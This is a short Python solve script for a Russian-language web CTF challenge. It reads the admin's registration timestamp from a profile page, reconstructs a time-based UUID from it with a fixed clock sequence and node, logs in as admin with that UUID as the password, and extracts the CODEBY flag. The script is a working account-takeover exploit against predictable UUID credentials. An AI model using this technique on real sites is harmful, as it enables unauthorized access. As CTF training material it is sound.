# для решени таска с категории Веб "Форум предсказателей"

import uuid
import requests
from datetime import datetime
def generate_uuid(timestamp_str):
    try:
        timestamp = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S.%f")
        uuid_epoch = datetime(1582, 10, 15)
        intervals = int((timestamp - uuid_epoch).total_seconds() * 1e7)
        clock_seq = 0x89ca
        node = 0x000c297433a0
        uuid1 = uuid.UUID(fields=(intervals & 0xFFFFFFFF,
                                  (intervals >> 32) & 0xFFFF,
                                  ((intervals >> 48) & 0x0FFF) | (1 << 12),
                                  clock_seq >> 8,
                                  clock_seq & 0xFF,
                                  node))
        return str(uuid1)
    except ValueError as e:
        print(f"Ошибка: {e}")
        return "Ошибка: время (timestamp)."

TASK_URL = "http://TASK_URL"

admin_page_profile = requests.get(f'{TASK_URL}/profile/1')
time_stamp = admin_page_profile.text.split('Дата регистрации на форуме:')[1].split('На главную')[0]
time_stamp = time_stamp.split('> ')[1].split('<')[0]
password = generate_uuid(time_stamp)

request = requests.post(f"{TASK_URL}/login", data={"username":"admin", "password":f"{password}"})
response = request.text
if "Уникальный идентификатор:</strong> 1" in response:
    if "CODEBY{" in response:
        flag = "CODEBY{" + response.split("CODEBY{")[1].split("}")[0] + '}'
        print(f"FLAG FOUND: {flag}")
    else:
        print("FLAG NOT FOUND")
else:
    print("PAGE - NOT ADMIN'S PROFILE")

